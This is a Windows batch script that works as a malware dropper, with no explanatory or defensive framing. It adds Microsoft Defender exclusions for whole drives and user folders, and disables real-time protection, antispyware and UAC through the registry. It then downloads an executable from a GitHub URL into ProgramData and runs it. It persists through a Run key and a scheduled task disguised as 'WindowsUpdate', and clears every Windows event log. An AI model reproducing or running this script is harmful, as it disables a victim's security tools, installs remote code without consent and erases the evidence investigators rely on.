@echo off 
Powershell -windowstyle hidden Add-MpPreference -ExclusionPath '%systemdrive%'
echo -----------Defender-bypass------------------------
Powershell Add-MpPreference -ExclusionPath 'c:\'
Powershell Add-MpPreference -ExclusionPath '%tmp%'
Powershell Add-MpPreference -ExclusionPath '%appdata%'
Powershell Add-MpPreference -ExclusionPath '%systemdrive%\programdata\Windata'
echo ---------regedit-edite------------------------------------------------
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications" /v ToastEnabled /t REG_DWORD /d 0 /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications" /v LockScreenToastEnabled /t REG_DWORD /d 0 /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\MSEdge" /v Enabled /t REG_DWORD /d 0 /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter" /v Enabled /t REG_DWORD /d 0 /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Explorer" /v DisableNotificationCenter /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d "1" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v TamperProtection /t REG_DWORD /d "1" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
cls
echo --------------------cerete-my-path--------------------------------------------------
mkdir "%systemdrive%\programdata\64-Win"
echo ----------------------------copy-my-files-to-web-sever-------------------------------------
PowerShell.exe (New-Object System.Net.WebClient).DownloadFile('https://github.com/Splash2520/splash/raw/refs/heads/main/Network.bat','%programdata%\64-Win\Network.exe')
echo -----------start-paylod------------------------
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "WindowsPowerup" /t REG_SZ /F /D "%programdata%\64-Win\Network.exe"
schtasks /create /tn WindowsUpdate /ru "%username%" /sc ONSTART /DELAY 0000:30  /RL HIGHEST /tr "%programdata%\64-Win\Network.exe" /f
start %programdata%\64-Win\Network.exe
echo -----------delete-evnt-log-------------------------------------------
for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"